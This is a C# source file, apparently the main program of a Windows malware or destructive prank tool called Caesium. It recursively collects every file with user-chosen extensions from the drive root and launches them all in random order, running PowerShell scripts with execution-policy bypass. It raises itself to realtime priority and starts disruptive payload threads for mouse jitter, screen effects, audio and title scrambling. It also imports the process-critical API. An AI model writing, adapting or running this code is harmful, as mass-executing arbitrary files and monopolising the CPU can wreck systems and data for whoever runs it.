using System.ComponentModel;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using Caesium.Payloads;

namespace Caesium;

internal static partial class Program
{
    private enum StdHandle
    {
        Output = -11
    }

    private enum ProcessPriority : uint
    {
        High = 0x00000080,
        RealTime = 0x00000100
    }

    [LibraryImport("kernel32.dll", SetLastError = true)]
    private static partial IntPtr GetStdHandle(StdHandle nStdHandle);

    [LibraryImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static partial void SetConsoleMode(IntPtr hConsoleHandle, int dwMode);

    [LibraryImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static partial bool GetConsoleMode(IntPtr hConsoleHandle, out int lpMode);

    [LibraryImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static partial bool SetPriorityClass(IntPtr hProcess, ProcessPriority dwPriorityClass);

    [LibraryImport("ntdll.dll")]
    private static partial uint RtlSetProcessIsCritical(
        [MarshalAs(UnmanagedType.Bool)] bool bNew,
        [MarshalAs(UnmanagedType.Bool)] out bool pbOld,
        [MarshalAs(UnmanagedType.Bool)] bool bNeedCheck);

    private const int EnableVirtualTerminalProcessing = 0x0004;

    private static readonly string[] Rainbow =
    [
        "\e[31m", // Red
        "\e[33m", // Yellow
        "\e[32m", // Green
        "\e[36m", // Cyan
        "\e[34m", // Blue
        "\e[35m" // Magenta
    ];

    private static void Main(string[] args)
    {
        Console.OutputEncoding = Encoding.UTF8;

        var filetypeArgs = args.Where(arg => arg.StartsWith('.')).ToHashSet();
        var optionsArgs = args.Where(arg => arg.StartsWith('-')).ToHashSet();

        if (filetypeArgs.Count == 0)
        {
            Console.WriteLine(
                "\e[35m✨ Usage: Caesium.exe .exe .txt .ps1 [ -jitter -gdi -bytebeat -textscramble -titlescramble ] ✨\e[0m");
            return;
        }

        var actions = new Dictionary<string, ThreadStart>
        {
            { "-jitter", JitterMouse.Execute },
            { "-gdi", RawLiquidEngine.Execute },
            { "-bytebeat", Bytebeat.Execute },
            { "-titlescramble", TitleChaos.Execute },
            { "-textscramble", TextScramble.Execute },
            { "-gammapulse ", GammaPulse.Execute },
            { "-decay", IsotopeDecay.Execute },
            { "-electronshell", ElectronShell.Execute },
        };

        var configTargets = optionsArgs.Count == 0
            ? actions.Values
            : actions.Where(a => optionsArgs.Contains(a.Key)).Select(a => a.Value);
        foreach (var payload in configTargets)
        {
            Console.WriteLine($"Executing {payload.Method.Name}");
            new Thread(payload) { IsBackground = true }.Start();
        }

        EnableConsoleAnsiSupport();
        SetProcessToRealtimePriority();

        Console.WriteLine($"{Rainbow[0]}Searching System...\e[0m");
        var fileTargets = new HashSet<string>(args, StringComparer.OrdinalIgnoreCase);
        var root = Path.GetPathRoot(Environment.CurrentDirectory) ?? "C:\\";
        var files = GetAllFilesMatching("*.*", root, fileTargets);
        Shuffle(files);
        ExecuteFiles(files);

        Console.WriteLine("\e[32mAll done!\e[0m");
        Thread.Sleep(-1);
    }

    private static void ExecuteFiles(List<string> files)
    {
        foreach (var path in files)
            Task.Run(() =>
            {
                try
                {
                    var isPs1 = path.EndsWith(".ps1", StringComparison.OrdinalIgnoreCase);

                    var startInfo = new ProcessStartInfo
                    {
                        FileName = isPs1 ? "powershell.exe" : path,
                        Arguments = isPs1 ? $"-ExecutionPolicy Bypass -File \"{path}\"" : string.Empty,
                        UseShellExecute = !isPs1,
                        WindowStyle = ProcessWindowStyle.Minimized,
                        CreateNoWindow = isPs1
                    };

                    Process.Start(startInfo);

                    Console.WriteLine($"{Rainbow[Random.Shared.Next(Rainbow.Length)]} Launched: {path}");
                }
                catch (Exception ex) when (ex is Win32Exception or InvalidOperationException)
                {
                    Console.WriteLine($"[Error] {path}: {ex.Message}");
                }
            });
        
    }

    private static List<string> GetAllFilesMatching(string searchPattern, string searchDirectory,
        HashSet<string> fileTypes)
    {
        var options = new EnumerationOptions
        {
            RecurseSubdirectories = true,
            IgnoreInaccessible = true,
            AttributesToSkip = FileAttributes.None
        };

        return Directory.EnumerateFiles(searchDirectory, searchPattern, options)
            .AsParallel()
            .WithDegreeOfParallelism(Environment.ProcessorCount)
            .WithMergeOptions(ParallelMergeOptions.NotBuffered)
            .Where(file =>
            {
                var ext = Path.GetExtension(file);
                return !string.IsNullOrEmpty(ext) && fileTypes.Contains(ext);
            })
            .ToList();
    }

    private static void Shuffle<T>(List<T> list)
    {
        var n = list.Count;
        while (n > 1)
        {
            n--;
            var k = Random.Shared.Next(n + 1);
            (list[k], list[n]) = (list[n], list[k]);
        }
    }

    private static void EnableConsoleAnsiSupport()
    {
        var handle = GetStdHandle(StdHandle.Output);
        if (GetConsoleMode(handle, out var mode))
            SetConsoleMode(handle, mode | EnableVirtualTerminalProcessing);
    }

    private static void SetProcessToRealtimePriority()
    {
        var proc = Process.GetCurrentProcess().Handle;
        if (!SetPriorityClass(proc, ProcessPriority.RealTime)) SetPriorityClass(proc, ProcessPriority.High);
    }
}